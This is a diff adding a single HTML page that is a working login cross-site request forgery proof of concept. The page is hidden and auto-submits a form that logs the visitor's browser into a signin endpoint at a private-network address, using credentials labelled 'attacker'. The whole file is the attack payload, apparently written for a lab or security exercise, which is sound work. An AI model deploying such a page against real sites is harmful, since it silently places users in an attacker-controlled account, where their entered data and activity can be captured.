@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+    </head>
+    <body hidden>
+        <form id="target" action="http://10.0.0.25:3000/signin" method="post">
+            <input type="hidden" name="email" value="attacker">
+            <input type="hidden" name="password" value="attacker">
+            <div class="form-group form-more-space">
+                <button id="log-in-btn" type="submit">Login</button>
+            </div>
+        </form>
+        <iframe name="xxxhhh" id="xxxhhh">
+            
+        </iframe>
+        <script>
+$(document).ready(function(){
+    $('#target').submit();
+});
+        </script>
+    </body>
+</html>
